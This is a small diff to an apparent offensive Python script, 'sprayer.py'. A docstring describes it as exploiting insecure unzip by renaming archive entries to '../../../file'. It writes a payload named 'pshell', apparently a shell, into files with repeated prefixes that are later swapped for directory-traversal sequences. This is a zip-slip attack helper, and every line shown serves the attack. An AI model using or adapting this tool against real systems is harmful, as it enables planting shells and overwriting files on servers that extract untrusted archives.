@@ -1,4 +1,10 @@
+"""
+"insecure unzip 
+rename files in archives ../../../file
+
+"""
 from  sys import argv,exit
+import os
 try :
   file_name = argv[1]
   lenght = int(argv[2])
@@ -7,7 +13,7 @@ try :
 except:
   print("[-] give valid file path\n usage sprayer.py <file_path> <number_of_dot_dot_pwn>")
   exit(0)
-spray = "xxa"
+spray = "ZZY"
 for i in range(1,lenght):
   with open(spray*i+file_name,"wb") as f:
     f.write(pshell)
